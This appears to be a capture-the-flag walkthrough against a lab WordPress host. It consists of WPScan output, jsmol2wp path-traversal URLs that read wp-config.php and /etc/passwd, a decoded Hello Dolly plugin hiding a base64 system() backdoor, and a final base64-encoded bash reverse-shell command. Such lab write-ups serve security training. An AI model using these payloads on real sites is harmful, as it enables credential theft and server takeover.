    wpscan --url http://www.smol.thm/

---

         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    [+] URL: http://www.smol.thm/ [10.129.146.129]
    [+] Started: Sun Mar 22 17:13:15 2026

    Interesting Finding(s):

    [+] Headers
     | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
     | Found By: Headers (Passive Detection)
     | Confidence: 100%

    [+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

    [+] WordPress readme found: http://www.smol.thm/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%

    [+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21).
     | Found By: Rss Generator (Passive Detection)
     |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
     |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

    [+] WordPress theme in use: twentytwentythree
     | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
     | Last Updated: 2024-11-13T00:00:00.000Z
     | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
     | [!] The version is out of date, the latest version is 1.6
     | [!] Directory listing is enabled
     | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
     | Style Name: Twenty Twenty-Three
     | Style URI: https://wordpress.org/themes/twentytwentythree
     | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
     | Author: the WordPress team
     | Author URI: https://wordpress.org
     |
     | Found By: Urls In Homepage (Passive Detection)
     |
     | Version: 1.2 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

    [+] Enumerating All Plugins (via Passive Methods)
    [+] Checking Plugin Versions (via Passive and Aggressive Methods)

    [i] Plugin(s) Identified:

    [+] jsmol2wp
     | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
     | Latest Version: 1.07 (up to date)
     | Last Updated: 2018-03-09T10:28:00.000Z
     |
     | Found By: Urls In Homepage (Passive Detection)
     |
     | Version: 1.07 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
     Checking Config Backups - Time: 00:00:01 <===============================================> (137 / 137) 100.00% Time: 00:00:01

    [i] No Config Backups Found.

    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

    [+] Finished: Sun Mar 22 17:13:19 2026
    [+] Requests Done: 139
    [+] Cached Requests: 37
    [+] Data Sent: 35.218 KB
    [+] Data Received: 19.862 KB
    [+] Memory used: 272.664 MB
    [+] Elapsed time: 00:00:04

The `jsmol2wp` WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd`

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/convert.base64-encode/resource=../../hello.php`

    echo "PD9waHAKLyoqCiAqIEBwYWNrYWdlIEhlbGxvX0RvbGx5CiAqIEB2ZXJzaW9uIDEuNy4yCiAqLwovKgpQbHVnaW4gTmFtZTogSGVsbG8gRG9sbHkKUGx1Z2luIFVSSTogaHR0cDovL3dvcmRwcmVzcy5vcmcvcGx1Z2lucy9oZWxsby1kb2xseS8KRGVzY3JpcHRpb246IFRoaXMgaXMgbm90IGp1c3QgYSBwbHVnaW4sIGl0IHN5bWJvbGl6ZXMgdGhlIGhvcGUgYW5kIGVudGh1c2lhc20gb2YgYW4gZW50aXJlIGdlbmVyYXRpb24gc3VtbWVkIHVwIGluIHR3byB3b3JkcyBzdW5nIG1vc3QgZmFtb3VzbHkgYnkgTG91aXMgQXJtc3Ryb25nOiBIZWxsbywgRG9sbHkuIFdoZW4gYWN0aXZhdGVkIHlvdSB3aWxsIHJhbmRvbWx5IHNlZSBhIGx5cmljIGZyb20gPGNpdGU+SGVsbG8sIERvbGx5PC9jaXRlPiBpbiB0aGUgdXBwZXIgcmlnaHQgb2YgeW91ciBhZG1pbiBzY3JlZW4gb24gZXZlcnkgcGFnZS4KQXV0aG9yOiBNYXR0IE11bGxlbndlZwpWZXJzaW9uOiAxLjcuMgpBdXRob3IgVVJJOiBodHRwOi8vbWEudHQvCiovCgpmdW5jdGlvbiBoZWxsb19kb2xseV9nZXRfbHlyaWMoKSB7CgkvKiogVGhlc2UgYXJlIHRoZSBseXJpY3MgdG8gSGVsbG8gRG9sbHkgKi8KCSRseXJpY3MgPSAiSGVsbG8sIERvbGx5CldlbGwsIGhlbGxvLCBEb2xseQpJdCdzIHNvIG5pY2UgdG8gaGF2ZSB5b3UgYmFjayB3aGVyZSB5b3UgYmVsb25nCllvdSdyZSBsb29raW4nIHN3ZWxsLCBEb2xseQpJIGNhbiB0ZWxsLCBEb2xseQpZb3UncmUgc3RpbGwgZ2xvd2luJywgeW91J3JlIHN0aWxsIGNyb3dpbicKWW91J3JlIHN0aWxsIGdvaW4nIHN0cm9uZwpJIGZlZWwgdGhlIHJvb20gc3dheWluJwpXaGlsZSB0aGUgYmFuZCdzIHBsYXlpbicKT25lIG9mIG91ciBvbGQgZmF2b3JpdGUgc29uZ3MgZnJvbSB3YXkgYmFjayB3aGVuClNvLCB0YWtlIGhlciB3cmFwLCBmZWxsYXMKRG9sbHksIG5ldmVyIGdvIGF3YXkgYWdhaW4KSGVsbG8sIERvbGx5CldlbGwsIGhlbGxvLCBEb2xseQpJdCdzIHNvIG5pY2UgdG8gaGF2ZSB5b3UgYmFjayB3aGVyZSB5b3UgYmVsb25nCllvdSdyZSBsb29raW4nIHN3ZWxsLCBEb2xseQpJIGNhbiB0ZWxsLCBEb2xseQpZb3UncmUgc3RpbGwgZ2xvd2luJywgeW91J3JlIHN0aWxsIGNyb3dpbicKWW91J3JlIHN0aWxsIGdvaW4nIHN0cm9uZwpJIGZlZWwgdGhlIHJvb20gc3dheWluJwpXaGlsZSB0aGUgYmFuZCdzIHBsYXlpbicKT25lIG9mIG91ciBvbGQgZmF2b3JpdGUgc29uZ3MgZnJvbSB3YXkgYmFjayB3aGVuClNvLCBnb2xseSwgZ2VlLCBmZWxsYXMKSGF2ZSBhIGxpdHRsZSBmYWl0aCBpbiBtZSwgZmVsbGFzCkRvbGx5LCBuZXZlciBnbyBhd2F5ClByb21pc2UsIHlvdSdsbCBuZXZlciBnbyBhd2F5CkRvbGx5J2xsIG5ldmVyIGdvIGF3YXkgYWdhaW4iOwoKCS8vIEhlcmUgd2Ugc3BsaXQgaXQgaW50byBsaW5lcy4KCSRseXJpY3MgPSBleHBsb2RlKCAiXG4iLCAkbHlyaWNzICk7CgoJLy8gQW5kIHRoZW4gcmFuZG9tbHkgY2hvb3NlIGEgbGluZS4KCXJldHVybiB3cHRleHR1cml6ZSggJGx5cmljc1sgbXRfcmFuZCggMCwgY291bnQoICRseXJpY3MgKSAtIDEgKSBdICk7Cn0KCi8vIFRoaXMganVzdCBlY2hvZXMgdGhlIGNob3NlbiBsaW5lLCB3ZSdsbCBwb3NpdGlvbiBpdCBsYXRlci4KZnVuY3Rpb24gaGVsbG9fZG9sbHkoKSB7CglldmFsKGJhc2U2NF9kZWNvZGUoJ0NpQnBaaUFvYVhOelpYUW9KRjlIUlZSYklsd3hORE5jTVRVMVhIZzJOQ0pkS1NrZ2V5QnplWE4wWlcwb0pGOUhSVlJiSWx3eE5ETmNlRFprWERFME5DSmRLVHNnZlNBPScpKTsKCQoJJGNob3NlbiA9IGhlbGxvX2RvbGx5X2dldF9seXJpYygpOwoJJGxhbmcgICA9ICcnOwoJaWYgKCAnZW5fJyAhPT0gc3Vic3RyKCBnZXRfdXNlcl9sb2NhbGUoKSwgMCwgMyApICkgewoJCSRsYW5nID0gJyBsYW5nPSJlbiInOwoJfQoKCXByaW50ZigKCQknPHAgaWQ9ImRvbGx5Ij48c3BhbiBjbGFzcz0ic2NyZWVuLXJlYWRlci10ZXh0Ij4lcyA8L3NwYW4+PHNwYW4gZGlyPSJsdHIiJXM+JXM8L3NwYW4+PC9wPicsCgkJX18oICdRdW90ZSBmcm9tIEhlbGxvIERvbGx5IHNvbmcsIGJ5IEplcnJ5IEhlcm1hbjonICksCgkJJGxhbmcsCgkJJGNob3NlbgoJKTsKfQoKLy8gTm93IHdlIHNldCB0aGF0IGZ1bmN0aW9uIHVwIHRvIGV4ZWN1dGUgd2hlbiB0aGUgYWRtaW5fbm90aWNlcyBhY3Rpb24gaXMgY2FsbGVkLgphZGRfYWN0aW9uKCAnYWRtaW5fbm90aWNlcycsICdoZWxsb19kb2xseScgKTsKCi8vIFdlIG5lZWQgc29tZSBDU1MgdG8gcG9zaXRpb24gdGhlIHBhcmFncmFwaC4KZnVuY3Rpb24gZG9sbHlfY3NzKCkgewoJZWNobyAiCgk8c3R5bGUgdHlwZT0ndGV4dC9jc3MnPgoJI2RvbGx5IHsKCQlmbG9hdDogcmlnaHQ7CgkJcGFkZGluZzogNXB4IDEwcHg7CgkJbWFyZ2luOiAwOwoJCWZvbnQtc2l6ZTogMTJweDsKCQlsaW5lLWhlaWdodDogMS42NjY2OwoJfQoJLnJ0bCAjZG9sbHkgewoJCWZsb2F0OiBsZWZ0OwoJfQoJLmJsb2NrLWVkaXRvci1wYWdlICNkb2xseSB7CgkJZGlzcGxheTogbm9uZTsKCX0KCUBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDc4MnB4KSB7CgkJI2RvbGx5LAoJCS5ydGwgI2RvbGx5IHsKCQkJZmxvYXQ6IG5vbmU7CgkJCXBhZGRpbmctbGVmdDogMDsKCQkJcGFkZGluZy1yaWdodDogMDsKCQl9Cgl9Cgk8L3N0eWxlPgoJIjsKfQoKYWRkX2FjdGlvbiggJ2FkbWluX2hlYWQnLCAnZG9sbHlfY3NzJyApOwo=" | base64 -d
    <?php
    /**
     * @package Hello_Dolly
     * @version 1.7.2
     */
    /*
    Plugin Name: Hello Dolly
    Plugin URI: http://wordpress.org/plugins/hello-dolly/
    Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
    Author: Matt Mullenweg
    Version: 1.7.2
    Author URI: http://ma.tt/
    */

    function hello_dolly_get_lyric() {
            /** These are the lyrics to Hello Dolly */
            $lyrics = "Hello, Dolly
    Well, hello, Dolly
    It's so nice to have you back where you belong
    You're lookin' swell, Dolly
    I can tell, Dolly
    You're still glowin', you're still crowin'
    You're still goin' strong
    I feel the room swayin'
    While the band's playin'
    One of our old favorite songs from way back when
    So, take her wrap, fellas
    Dolly, never go away again
    Hello, Dolly
    Well, hello, Dolly
    It's so nice to have you back where you belong
    You're lookin' swell, Dolly
    I can tell, Dolly
    You're still glowin', you're still crowin'
    You're still goin' strong
    I feel the room swayin'
    While the band's playin'
    One of our old favorite songs from way back when
    So, golly, gee, fellas
    Have a little faith in me, fellas
    Dolly, never go away
    Promise, you'll never go away
    Dolly'll never go away again";

            // Here we split it into lines.
            $lyrics = explode( "\n", $lyrics );

            // And then randomly choose a line.
            return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
    }

    // This just echoes the chosen line, we'll position it later.
    function hello_dolly() {
            eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

            $chosen = hello_dolly_get_lyric();
            $lang   = '';
            if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
                    $lang = ' lang="en"';
            }

            printf(
                    '<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
                    __( 'Quote from Hello Dolly song, by Jerry Herman:' ),
                    $lang,
                    $chosen
            );
    }

    // Now we set that function up to execute when the admin_notices action is called.
    add_action( 'admin_notices', 'hello_dolly' );

    // We need some CSS to position the paragraph.
    function dolly_css() {
            echo "
            <style type='text/css'>
            #dolly {
                    float: right;
                    padding: 5px 10px;
                    margin: 0;
                    font-size: 12px;
                    line-height: 1.6666;
            }
            .rtl #dolly {
                    float: left;
            }
            .block-editor-page #dolly {
                    display: none;
            }
            @media screen and (max-width: 782px) {
                    #dolly,
                    .rtl #dolly {
                            float: none;
                            padding-left: 0;
                            padding-right: 0;
                    }
            }
            </style>
            ";
    }

    add_action( 'admin_head', 'dolly_css' );

`http://www.smol.thm/wp-admin/profile.php?cmd=echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzQuMjUxLzQ0NDQgMD4mMQ== | base64 -d | bash`
